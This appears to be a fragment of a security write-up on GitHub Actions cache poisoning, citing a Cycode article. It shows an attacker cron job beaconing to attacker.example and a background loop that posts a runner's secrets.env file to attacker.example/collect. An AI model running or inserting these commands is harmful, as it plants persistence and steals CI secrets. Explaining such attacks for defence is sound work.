...
echo '* * * * * curl https://attacker.example/beacon' >> /var/spool/cron/crontabs/runner
...
nohup bash -c 'while true; do
  if [ -f /home/runner/work/*/secrets.env ]; then
    curl -d @/home/runner/work/*/secrets.env https://attacker.example/collect
  fi
  sleep 10
done' &>/dev/null &
```
...
- Cycode: GitHub Actions Cache Poisoning (the original article URL is no longer available)
